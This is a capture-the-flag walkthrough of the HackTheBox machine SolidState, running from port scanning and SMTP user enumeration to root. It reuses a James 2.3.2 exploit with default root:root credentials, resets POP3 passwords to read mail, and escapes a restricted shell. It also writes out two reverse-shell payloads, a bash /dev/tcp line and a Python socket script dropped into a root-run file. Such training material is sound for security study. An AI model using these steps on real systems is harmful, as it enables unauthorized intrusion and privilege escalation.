# Recon
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.51 -T5
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/SolidState/assets/1.png">

# Port 25
We'll use a nmap script to enumerate users.
```
nmap --script smtp-enum-users.nse 10.10.10.51 -p 25 -Pn
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/SolidState/assets/2.png">

We find the user ```root```

# Port 4555
James Remote Administration Tool 2.3.2 is running on this port. The pop3 users are being managed within this service and we can change the users password. The default login is ```root:root```.

> Exploit: https://www.exploit-db.com/exploits/35513

We changed the payload so it would create a reverse shell:
```
payload = 'bash -i >& /dev/tcp/10.10.14.5/4445> 0>&1'
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/SolidState/assets/3.png">

# Port 110
We change the password for every user to ```test``` and successfully login at the pop3 service. We find a mail which contains a password:
```
telnet 10.10.10.51 110
USER mindy
PASS test
STAT
RETR 2
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/SolidState/assets/4.png">

# Initial Foothold
With the found credentials we can now login using SSH. We end up in an restricted environment:
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/SolidState/assets/5.png">

Logging back in but we 'disable' loading rbash:
```
ssh mindy@10.10.10.51 'bash --noprofile'
```
Now we can download enumeration scripts like linpeas.sh or linenum.sh. Run linenum with thorough scan:
```
bash linenum.sh -t
```
We spot a script that we can edit which is owned by root. We change it contents with a php reverse shell and have a root shell on the host.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/SolidState/assets/6.png">

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /opt/tmp.py
```
After we wait for a moment we get a shell as root.






